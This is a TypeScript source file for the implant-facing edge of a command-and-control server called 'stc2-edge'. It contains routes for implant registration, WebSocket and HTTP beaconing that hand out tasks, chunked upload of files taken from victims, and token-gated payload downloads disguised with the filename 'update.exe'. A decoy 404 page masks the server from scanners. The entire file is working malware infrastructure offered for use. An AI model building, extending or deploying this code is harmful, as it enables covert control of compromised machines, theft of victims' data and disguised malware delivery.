/**
 * stc2-edge —— 植入体平面。
 *
 * 只暴露"交结果 / 取任务 / 下文件 / 下载荷"这四类端点，
 * **没有任何读数据的接口**（避免把 C2 变成可枚举的数据库）。
 */

import { Hono } from 'hono';
import { LIMITS } from '@stratus/shared';
import { createDb, eq, sql, t } from '@stratus/db';
import { authenticateSession, handleRegister, jsonError, readJsonLimited } from './auth';
import type { Env } from './types';

export { SessionDO } from './do/session';
export { HubDO } from './do/hub';

const app = new Hono<{ Bindings: Env }>();

/* ───────────────────────────── 探活 ───────────────────────────── */

app.get('/health', () => new Response('ok', { headers: { 'cache-control': 'no-store' } }));

/* ───────────────────────────── 注册 ───────────────────────────── */

app.post('/v1/register', (c) => handleRegister(c.env, c.req.raw));

/* ───────────────────────────── WS 主通道 ───────────────────────────── */

app.get('/v1/ws/beacon', async (c) => {
  if (c.req.header('upgrade')?.toLowerCase() !== 'websocket') {
    return new Response('expected websocket', { status: 426 });
  }
  const auth = await authenticateSession(c.env, c.req.raw);
  if (!auth.ok) return auth.res;

  const stub = c.env.SESSION.get(c.env.SESSION.idFromName(auth.auth.sid));
  const doUrl = new URL(c.req.url);
  doUrl.pathname = '/ws';
  doUrl.search = '?role=implant';

  const res = await stub.fetch(new Request(doUrl.toString(), c.req.raw));

  // 会话上线事件推给 Hub（给控制台的列表用）
  c.executionCtx.waitUntil(
    c.env.HUB.get(c.env.HUB.idFromName('hub'))
      .fetch('https://hub/presence', {
        method: 'POST',
        body: JSON.stringify({ sid: auth.auth.sid, status: 'online' }),
      })
      .catch(() => undefined),
  );

  return res;
});

/* ───────────────────────────── HTTP 兜底 ───────────────────────────── */

app.post('/v1/beacon', async (c) => {
  const auth = await authenticateSession(c.env, c.req.raw);
  if (!auth.ok) return auth.res;

  const body = await readJsonLimited<{ up?: unknown[]; want?: number }>(c.req.raw, LIMITS.maxBeaconBytes);
  if (!body) return jsonError(400, 'E_FORMAT', 'bad body');
  if (Array.isArray(body.up) && body.up.length > LIMITS.maxBeaconUp) {
    return jsonError(413, 'E_TOO_LARGE', 'too many frames');
  }

  const stub = c.env.SESSION.get(c.env.SESSION.idFromName(auth.auth.sid));
  const res = await stub.fetch('https://do/beacon', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ up: body.up ?? [], want: body.want ?? 8 }),
  });

  const out = new Response(res.body, res);
  out.headers.set('cache-control', 'no-store');
  return out;
});

/* ───────────────────────────── 文件分片 ───────────────────────────── */

app.put('/v1/file/:tid/:idx', async (c) => {
  const auth = await authenticateSession(c.env, c.req.raw);
  if (!auth.ok) return auth.res;

  const tid = c.req.param('tid');
  const idx = Number(c.req.param('idx'));
  if (!Number.isInteger(idx) || idx < 0 || idx > 100_000) return jsonError(400, 'E_FORMAT', 'bad index');

  const size = Number(c.req.header('x-stc2-size') ?? '0');
  if (!size || size > LIMITS.chunkSize * 2) return jsonError(413, 'E_TOO_LARGE', 'bad chunk size');

  const db = createDb(c.env.DB);
  const file = await db
    .select({ id: t.files.id, sessionId: t.files.sessionId })
    .from(t.files)
    .where(eq(t.files.id, tid))
    .limit(1)
    .then((r) => r[0]);
  if (!file || file.sessionId !== auth.auth.sid) return jsonError(404, 'E_NOT_FOUND', 'not found');

  const key = `${c.env.ENV_NAME}/sessions/${auth.auth.sid}/files/${tid}/${String(idx).padStart(5, '0')}`;
  const body = c.req.raw.body;
  if (!body) return jsonError(400, 'E_FORMAT', 'empty body');

  await c.env.R2.put(key, body, {
    httpMetadata: { contentType: 'application/octet-stream' },
    customMetadata: { sid: auth.auth.sid, tid, idx: String(idx) },
  });

  const now = Math.floor(Date.now() / 1000);
  await db.batch([
    db
      .insert(t.fileChunks)
      .values({ transferId: tid, idx, size, sha256: c.req.header('x-stc2-sha256') ?? null, createdAt: now })
      .onConflictDoUpdate({
        target: [t.fileChunks.transferId, t.fileChunks.idx],
        set: { size, sha256: c.req.header('x-stc2-sha256') ?? null },
      }),
    db
      .update(t.files)
      .set({ chunksDone: sql`${t.files.chunksDone} + 1`, updatedAt: now })
      .where(eq(t.files.id, tid)),
  ]);

  return new Response(null, { status: 204 });
});

app.get('/v1/file/:tid/:idx', async (c) => {
  const auth = await authenticateSession(c.env, c.req.raw);
  if (!auth.ok) return auth.res;

  const tid = c.req.param('tid');
  const idx = Number(c.req.param('idx'));
  const db = createDb(c.env.DB);
  const file = await db
    .select({ id: t.files.id, sessionId: t.files.sessionId })
    .from(t.files)
    .where(eq(t.files.id, tid))
    .limit(1)
    .then((r) => r[0]);
  if (!file || file.sessionId !== auth.auth.sid) return jsonError(404, 'E_NOT_FOUND', 'not found');

  const key = `${c.env.ENV_NAME}/sessions/${auth.auth.sid}/files/${tid}/${String(idx).padStart(5, '0')}`;
  const obj = await c.env.R2.get(key);
  if (!obj) return jsonError(404, 'E_NOT_FOUND', 'chunk not found');

  return new Response(obj.body, {
    headers: {
      'content-type': 'application/octet-stream',
      'cache-control': 'no-store',
      'x-stc2-sha256': obj.customMetadata?.['sha256'] ?? '',
    },
  });
});

/* ───────────────────────────── 载荷下载 ───────────────────────────── */

app.get('/d/:token', async (c) => {
  const token = c.req.param('token');
  const raw = await c.env.TOKENS.get(`dl:${token}`);
  if (!raw) return decoy(c.env, c.req.raw);

  const info = JSON.parse(raw) as { payload_id: string; r2_key: string; one_time?: boolean };
  const obj = await c.env.R2.get(info.r2_key);
  if (!obj) return decoy(c.env, c.req.raw);

  if (info.one_time) {
    // 尽力删除；KV 最终一致，所以真正的"一次性"靠 10 分钟 TTL
    c.executionCtx.waitUntil(c.env.TOKENS.delete(`dl:${token}`));
  }

  return new Response(obj.body, {
    headers: {
      'content-type': 'application/octet-stream',
      'content-disposition': `attachment; filename="${c.req.query('name') ?? 'update.exe'}"`,
      'cache-control': 'no-store',
    },
  });
});

/* ───────────────────────────── 诱饵 ───────────────────────────── */

const DECOY_CDN = `<!doctype html><html><head><meta charset="utf-8"><title>404 Not Found</title>
<style>body{font-family:system-ui,-apple-system,"Segoe UI",sans-serif;margin:0;display:grid;place-items:center;height:100vh;color:#333}
h1{font-weight:500;font-size:22px}p{color:#666}</style></head>
<body><div><h1>404 Not Found</h1><p>The requested resource could not be found.</p></div></body></html>`;

function decoy(env: Env, _req: Request): Response {
  const mode = env.EDGE_DECOY ?? 'cdn';
  if (mode === 'off') return new Response(null, { status: 204 });
  if (mode === 'api') {
    return new Response(JSON.stringify({ error: 'not_found' }), {
      status: 404,
      headers: { 'content-type': 'application/json; charset=utf-8', 'cache-control': 'public, max-age=300' },
    });
  }
  return new Response(DECOY_CDN, {
    status: 404,
    headers: { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'public, max-age=300' },
  });
}

app.notFound((c) => decoy(c.env, c.req.raw));

app.onError((err, c) => {
  console.error('edge_error', err instanceof Error ? err.message : String(err));
  // 不对客户端泄露内部错误细节
  return decoy(c.env, c.req.raw);
});

export default app;
